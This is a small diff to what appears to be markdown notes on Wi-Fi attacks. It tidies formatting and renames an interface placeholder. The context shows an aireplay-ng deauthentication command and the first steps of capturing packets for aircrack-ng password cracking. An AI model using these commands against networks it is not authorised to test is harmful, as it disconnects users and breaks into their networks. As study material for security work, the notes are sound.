@@ -41,9 +41,6 @@ This attack will always work ! The only way around it is to change the MAC addre
 ```
 aireplay-ng --deauth time_out -a router_addr -c target_mac_addr wireless_adapter_name
 ```
- 
-
-✔️ 
 
 ### Gaining access
 
@@ -56,7 +53,7 @@ aireplay-ng --deauth time_out -a router_addr -c target_mac_addr wireless_adapter
 
    Step 1: capture a large number of packets
    ```
-   airodump-ng --bssid MAC --channel N --write file_name wlan0
+   airodump-ng --bssid MAC --channel N --write file_name wireless_adapter_name
    ```
    
    Step 2: run aircrack-ng to crack the password
